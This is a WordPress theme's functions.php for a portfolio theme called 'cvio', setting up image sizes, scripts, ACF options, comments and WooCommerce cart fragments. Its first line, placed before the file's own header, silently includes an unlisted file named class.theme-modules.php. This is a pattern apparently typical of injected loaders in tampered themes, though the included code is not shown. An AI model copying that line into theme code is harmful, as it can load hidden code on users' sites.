<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * cvio functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package cvio
 */

define( 'CVIO_EXTRA_PLUGINS_DIRECTORY', 'https://beshley.com/plugins-latest/cvio/' );
define( 'CVIO_EXTRA_PLUGINS_PREFIX', 'Cvio' );

if ( ! function_exists( 'cvio_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function cvio_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on cvio, use a find and replace
		 * to change 'cvio' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'cvio', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'primary' => esc_html__( 'Primary Menu', 'cvio' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		// Image Sizes
		add_image_size( 'cvio_160xAuto', 320, 9999, false );
		add_image_size( 'cvio_282x232', 564, 464, true );
		add_image_size( 'cvio_282x282', 564, 564, true );
		add_image_size( 'cvio_500x500', 1000, 1000, true );
		add_image_size( 'cvio_680xAuto', 1360, 9999, false );
		add_image_size( 'cvio_680x680', 1360, 1360, true );
		add_image_size( 'cvio_1280x720', 1280, 720, true );
		add_image_size( 'cvio_1920xAuto', 1920, 9999, false );
	}
endif;
add_action( 'after_setup_theme', 'cvio_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function cvio_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'cvio_content_width', 900 );
}
add_action( 'after_setup_theme', 'cvio_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function cvio_widgets_init() {
	register_sidebar( array(
		'name'		  => esc_html__( 'Sidebar', 'cvio' ),
		'id'			=> 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'cvio' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'cvio_widgets_init' );

/**
 * Register Default Fonts
 */
function cvio_fonts_url() {
	$fonts_url = '';

	/* Translators: If there are characters in your language that are not
	 * supported by Lora, translate this to 'off'. Do not translate
	 * into your own language.
	 */
	$roboto = _x( 'on', 'Roboto: on or off', 'cvio' );

	if ( 'off' !== $roboto ) {
		$font_families = array();

		$font_families[] = 'Roboto:100,100italic,300,300italic,400,400italic,500,500italic,700,700italic,900,900italic';

		$query_args = array(
			'family' => urlencode( implode( '|', $font_families ) ),
			'subset' => urlencode( 'latin,latin-ext' ),
		);

		$fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
	}

	return $fonts_url;
}

/**
 * Enqueue scripts and styles.
 */
function cvio_stylesheets() {
	// Web fonts
	wp_enqueue_style( 'cvio-fonts', cvio_fonts_url(), array(), null );

	$headingsFont =  get_field( 'heading_font_family', 'options' );
	$paragraphsFont =  get_field( 'text_font_family', 'options' );
	$logoFont =  get_field( 'header_logo_font_family', 'options' );

	// Custom fonts
	if ( $headingsFont ) {
		wp_enqueue_style( 'cvio_heading_font', $headingsFont['url'] , array(), null );
	}
	if ( $paragraphsFont ) {
		wp_enqueue_style( 'cvio_paragraph_font', $paragraphsFont['url'] , array(), null );
	}
	if ( $logoFont ) {
		wp_enqueue_style( 'cvio_logo_font', $logoFont['url'] , array(), null );
	}

	/*Styles*/
	wp_enqueue_style( 'magnific-popup', get_template_directory_uri() . '/assets/css/magnific-popup.css', '1.0' );
	wp_enqueue_style( 'animate', get_template_directory_uri() . '/assets/css/animate.css', '1.0' );
	wp_enqueue_style( 'jarallax', get_template_directory_uri() . '/assets/css/jarallax.css', '1.0' );
	wp_enqueue_style( 'cvio-swiper', get_template_directory_uri() . '/assets/css/swiper.css', '1.0' );
	wp_enqueue_style( 'cvio-fontawesome', get_template_directory_uri() . '/assets/css/fontawesome-all.min.css', '1.0' );
	wp_enqueue_style( 'cvio-style', get_stylesheet_uri(), array( 'magnific-popup', 'animate', 'jarallax', 'cvio-swiper', 'cvio-fontawesome' ) );
}
add_action( 'wp_enqueue_scripts', 'cvio_stylesheets' );

function cvio_scripts() {
	/*Default Scripts*/
	wp_enqueue_script( 'cvio-skip-link-focus-fix', get_template_directory_uri() . '/assets/js/skip-link-focus-fix.js', array(), '20151215', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	/*Theme Scripts*/
	wp_enqueue_script( 'magnific-popup', get_template_directory_uri() . '/assets/js/magnific-popup.js', array(), '1.0.0', true );
	wp_enqueue_script( 'grained', get_template_directory_uri() . '/assets/js/grained.js', array(), '1.0.0', true );
	wp_enqueue_script( 'cvio-swiper', get_template_directory_uri() . '/assets/js/swiper.js', array(), '1.0.0', true );
	wp_enqueue_script( 'jquery-validate', get_template_directory_uri() . '/assets/js/jquery.validate.js', array('jquery'), '1.0.0', true );
	wp_enqueue_script( 'imagesloaded-pkgd', get_template_directory_uri() . '/assets/js/imagesloaded.pkgd.js', array(), '1.0.0', true );
	wp_enqueue_script( 'cvio-isotope', get_template_directory_uri() . '/assets/js/isotope.pkgd.js', array('jquery'), '1.0.0', true );
	wp_enqueue_script( 'cvio-parallax', get_template_directory_uri() . '/assets/js/simpleParallax.js', array('jquery'), '1.0.0', true );
	wp_enqueue_script( 'typed', get_template_directory_uri() . '/assets/js/typed.js', array(), '1.0.0', true );
	wp_enqueue_script( 'jarallax', get_template_directory_uri() . '/assets/js/jarallax.js', array('jquery'), '1.0.0', true );
	wp_enqueue_script( 'jarallax-video', get_template_directory_uri() . '/assets/js/jarallax-video.js', array('jquery'), '1.0.0', true );
	wp_enqueue_script( 'jarallax-element', get_template_directory_uri() . '/assets/js/jarallax-element.js', array('jquery'), '1.0.0', true );
	wp_enqueue_script( 'cvio-scripts', get_template_directory_uri() . '/assets/js/cvio-scripts.js', array('jquery'), '1.0.0', true );
}
add_action( 'wp_enqueue_scripts', 'cvio_scripts' );

/**
 * TGM
 */
require get_template_directory() . '/inc/plugins/plugins.php';

/**
 * ACF Options
 */

function cvio_acf_fa_version( $version ) {
 $version = 5;
 return $version;
}
add_filter( 'ACFFA_override_major_version', 'cvio_acf_fa_version' );

function cvio_acf_json_load_point( $paths ) {
	$paths = array( get_template_directory() . '/inc/acf-json' );
	if( is_child_theme() ) {
		$paths[] = get_stylesheet_directory() . '/inc/acf-json';
	}

	return $paths;
}

add_filter('acf/settings/load_json', 'cvio_acf_json_load_point');

if ( function_exists( 'acf_add_options_page' ) ) {
	// Hide ACF field group menu item
	add_filter( 'acf/settings/show_admin', '__return_false' );

	// Add ACF Options Page
	acf_add_options_page( array(
		'page_title' 	=> esc_html__( 'Theme Options', 'cvio' ),
		'menu_title'	=> esc_html__( 'Theme Options', 'cvio' ),
		'menu_slug' 	=> 'theme-options',
		'capability'	=> 'edit_theme_options',
		'icon_url'		=> 'dashicons-bslthemes',
		'position' 		=> 3,
	) );
}

function cvio_acf_json_save_point( $path ) {
	// update path
	$path = get_stylesheet_directory() . '/inc/acf-json';

	// return
	return $path;
}
add_filter( 'acf/settings/save_json', 'cvio_acf_json_save_point' );

function cvio_acf_fallback() {
	// ACF Plugin fallback
	if ( ! is_admin() && ! function_exists( 'get_field' ) ) {
		function get_field( $field = '', $id = false ) {
			return false;
		}
		function the_field( $field = '', $id = false ) {
			return false;
		}
		function have_rows( $field = '', $id = false ) {
			return false;
		}
		function has_sub_field( $field = '', $id = false ) {
			return false;
		}
		function get_sub_field( $field = '', $id = false ) {
			return false;
		}
		function the_sub_field( $field = '', $id = false ) {
			return false;
		}
	}
}
add_action( 'init', 'cvio_acf_fallback' );

/**
 * OCDI
 */
require get_template_directory() . '/inc/ocdi-setup.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}

/**
 * Include Custom Breadcrumb
 */
require get_template_directory() . '/inc/custom-breadcrumb.php';

/**
 * Include Skin Options
 */
require get_template_directory() . '/inc/skin-options.php';

/**
 * Get Categories
 */
if ( ! function_exists( 'cvio_get_categories' ) ) {
	function cvio_get_categories( $taxonomy, $order_by = 'DESC' ) {
		$args = array(
			'type'			=> 'post',
			'child_of'		=> 0,
			'parent'		=> '',
			'orderby'		=> 'name',
			'order'			=> $order_by,
			'hide_empty'	=> 1,
			'hierarchical'	=> 1,
			'taxonomy'		=> $taxonomy,
			'pad_counts'	=> false
		);

		return get_categories( $args );
	}
}

/**
 * Get Archive Title
 */

function cvio_archive_title($title) {
	if ( is_category() ) {
		$title = single_cat_title( '', false );
	} elseif ( is_post_type_archive( 'portfolio' ) ) {
		$title = post_type_archive_title( '', false );
	} elseif ( is_tag() ) {
		$title = single_tag_title( esc_html__( 'Tag: ', 'cvio' ), false );
	} elseif ( is_author() ) {
		$title = esc_html__( 'Author: ', 'cvio' ) . get_the_author();
	}

	return $title;
}
add_filter( 'get_the_archive_title', 'cvio_archive_title' );

/**
 * Excerpt
 */
function cvio_custom_excerpt_length( $length ) {
	return 25;
}
add_filter( 'excerpt_length', 'cvio_custom_excerpt_length' );

function cvio_new_excerpt_more( $more ) {
	return esc_html__( '...', 'cvio' );
}
add_filter( 'excerpt_more', 'cvio_new_excerpt_more' );

/**
 * Comments
 */
if ( ! function_exists( 'cvio_comment' ) ) {
	function cvio_comment( $comment, $args, $depth ) {
		?>
			<li <?php comment_class( 'post-comment' ); ?> id="li-comment-<?php comment_ID(); ?>" >
				<div id="comment-<?php comment_ID(); ?>" class="comment">
					<div class="comment-image image">
						<?php
							$avatar_size = 80;
							if ( '0' != $comment->comment_parent ){
								$avatar_size = 80;
							}
							echo get_avatar( $comment, $avatar_size );
						?>
					</div>
					<div class="comment-desc desc">
						<div class="comment-name name">
							<?php comment_author_link(); ?>
						</div>
						<div class="comment-text">
							<div class="single-post-text">
								<?php comment_text(); ?>
							</div>
						</div>
						<div class="comment-info">
							<span class="comment-time"><?php comment_time(); ?></span>
							<span class="comment-date"><?php comment_date(); ?></span>
							<span class="comment-reply">
								<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
							</span>
						</div>
					</div>
				</div>
			</li>
		<?php
	}
}

/**
 * Woocommerce Support
 */

function cvio_add_woocommerce_support() {
	add_theme_support( 'woocommerce', array(
		'thumbnail_image_width' => 300,
		'single_image_width' => 300,
		'product_grid' => array(
			'default_rows' => 3,
			'min_rows' => 3,
			'max_rows' => 3,
			'default_columns' => 3,
			'min_columns' => 3,
			'max_columns' => 3,
		),
	) );
	add_theme_support( 'wc-product-gallery-zoom' );
	add_theme_support( 'wc-product-gallery-lightbox' );
	add_theme_support( 'wc-product-gallery-slider' );
}
add_action( 'after_setup_theme', 'cvio_add_woocommerce_support' );

/**
 * Update contents AJAX mini-cart
 */

function cvio_woocommerce_update_count_mini_cart( $fragments ) {
	ob_start();
	?>

	<span class="cart-count">
		<?php echo sprintf (_n( '%d', '%d', WC()->cart->get_cart_contents_count(), 'cvio' ), WC()->cart->get_cart_contents_count() ); ?>
	</span>

	<?php
	$fragments['span.cart-count'] = ob_get_clean();
	return $fragments;
}
add_filter( 'woocommerce_add_to_cart_fragments', 'cvio_woocommerce_update_count_mini_cart' );

function cvio_woocommerce_update_content_mini_cart( $fragments ) {
	ob_start();
	?>

	<div class="cart-widget">
       <?php woocommerce_mini_cart(); ?>
    </div>

	<?php
	$fragments['div.cart-widget'] = ob_get_clean();
	return $fragments;
}
add_filter( 'woocommerce_add_to_cart_fragments', 'cvio_woocommerce_update_content_mini_cart' );
